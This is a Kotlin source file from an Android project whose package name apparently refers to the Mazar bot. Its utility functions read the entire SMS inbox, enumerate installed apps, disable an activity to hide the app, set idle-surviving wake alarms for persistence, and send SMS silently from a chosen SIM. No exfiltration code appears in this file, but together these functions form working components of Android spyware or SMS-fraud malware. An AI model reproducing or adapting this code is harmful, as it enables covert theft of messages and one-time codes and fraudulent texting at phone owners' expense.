package org.reddeaddeath.classicbotmazar

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsManager
import android.telephony.SubscriptionManager
import android.util.Log

object UtilsMain {
    private const val TAG = "UtilsMain"

    private fun debugLog(message: String) {
        Log.d(TAG, message)
    }



    fun getApplication(context: Context): List<ApplicationsInfo> {
        debugLog("Getting all installed applications")
        val applications = mutableListOf<ApplicationsInfo>()
        
        try {
            val packageManager = context.packageManager
            val packages = packageManager.getInstalledPackages(0)
            
            for (packageInfo in packages) {
                try {
                    val applicationInfo = packageInfo.applicationInfo
                    if (applicationInfo == null) {
                        continue
                    }
                    
                    val appLabel = packageManager.getApplicationLabel(applicationInfo)
                    val appName = appLabel?.toString() ?: packageInfo.packageName
                    val packageName = packageInfo.packageName
                    val versionName = packageInfo.versionName
                    val versionCode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        packageInfo.longVersionCode
                    } else {
                        @Suppress("DEPRECATION")
                        packageInfo.versionCode.toLong()
                    }
                    
                    applications.add(
                        ApplicationsInfo(packageName, appName, versionName, versionCode)
                    )
                } catch (e: Exception) {
                    debugLog("Error getting app info for ${packageInfo.packageName}: ${e.message}")
                }
            }
            
            debugLog("Retrieved ${applications.size} installed applications")
        } catch (e: Exception) {
            debugLog("Error getting applications: ${e.message}")
        }
        
        return applications
    }



    fun getSMSInbox(context: Context): List<SmsMessageInbox> {
        debugLog("Getting SMS inbox messages")
        val messages = mutableListOf<SmsMessageInbox>()
        
        try {
            val uri = Uri.parse("content://sms/inbox")
            val cursor: Cursor? = context.contentResolver.query(
                uri,
                arrayOf("address", "body", "date", "type"),
                null,
                null,
                "date DESC"
            )
            
            cursor?.use {
                val addressIndex = it.getColumnIndex("address")
                val bodyIndex = it.getColumnIndex("body")
                val dateIndex = it.getColumnIndex("date")
                val typeIndex = it.getColumnIndex("type")
                
                while (it.moveToNext()) {
                    val address = if (addressIndex >= 0) it.getString(addressIndex) else ""
                    val body = if (bodyIndex >= 0) it.getString(bodyIndex) else ""
                    val date = if (dateIndex >= 0) it.getLong(dateIndex) else 0L
                    val type = if (typeIndex >= 0) it.getInt(typeIndex) else 0
                    
                    messages.add(SmsMessageInbox(address, body, date, type))
                }
            }
            
            debugLog("Retrieved ${messages.size} SMS inbox messages")
        } catch (e: SecurityException) {
            debugLog("SecurityException getting SMS inbox: ${e.message}")
        } catch (e: Exception) {
            debugLog("Error getting SMS inbox: ${e.message}")
        }
        
        return messages
    }
    fun disableActivity(context: Context, activityClass: Class<*>) {
        val componentName = ComponentName(context, activityClass)
        context.packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    fun startAlarm(context: Context, intervalMillis: Long, task: Int = 0) {
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(context, BrodCastReceiver::class.java)
        
        val checkPendingIntent = PendingIntent.getBroadcast(
            context,
            task,
            intent,
            PendingIntent.FLAG_NO_CREATE or PendingIntent.FLAG_IMMUTABLE
        )
        
        if (checkPendingIntent != null) {
            return
        }
        
        val pendingIntent = PendingIntent.getBroadcast(
            context,
            task,
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val triggerAtMillis = System.currentTimeMillis() + intervalMillis

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setAndAllowWhileIdle(
                AlarmManager.RTC_WAKEUP,
                triggerAtMillis,
                pendingIntent
            )
        } else {
            alarmManager.set(
                AlarmManager.RTC_WAKEUP,
                triggerAtMillis,
                pendingIntent
            )
        }
    }

    fun startBrodcastReceiver(context: Context) {
        context.sendBroadcast(Intent(context, BrodCastReceiver::class.java))
    }

    fun sendSMS(context: Context, phoneNumber: String, message: String, simSlot: Int = 0) {
        debugLog("Sending SMS to: $phoneNumber, simSlot: $simSlot")
        try {
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1 && simSlot > 0) {
                val subscriptionManager = SubscriptionManager.from(context)
                val subscriptions = subscriptionManager.activeSubscriptionInfoList
                if (subscriptions != null && subscriptions.size >= simSlot) {
                    val subscriptionId = subscriptions[simSlot - 1].subscriptionId
                    SmsManager.getSmsManagerForSubscriptionId(subscriptionId)
                } else {
                    debugLog("SIM slot $simSlot not available, using default")
                    SmsManager.getDefault()
                }
            } else {
                SmsManager.getDefault()
            }

            val parts = smsManager.divideMessage(message)

            if (parts.size == 1) {
                smsManager.sendTextMessage(phoneNumber, null, message, null, null)
                debugLog("SMS sent successfully to: $phoneNumber")
            } else {
                val sentIntents = ArrayList<PendingIntent>()
                val deliveryIntents = ArrayList<PendingIntent>()

                for (i in parts.indices) {
                    sentIntents.add(
                        PendingIntent.getBroadcast(
                            context,
                            i,
                            Intent("SMS_SENT"),
                            PendingIntent.FLAG_IMMUTABLE
                        )
                    )
                    deliveryIntents.add(
                        PendingIntent.getBroadcast(
                            context,
                            i,
                            Intent("SMS_DELIVERED"),
                            PendingIntent.FLAG_IMMUTABLE
                        )
                    )
                }

                smsManager.sendMultipartTextMessage(
                    phoneNumber,
                    null,
                    parts,
                    sentIntents,
                    deliveryIntents
                )
                debugLog("Multipart SMS sent successfully to: $phoneNumber")
            }
        } catch (e: SecurityException) {
            debugLog("SecurityException sending SMS: ${e.message}")
        } catch (e: Exception) {
            debugLog("Error sending SMS: ${e.message}")
        }
    }
}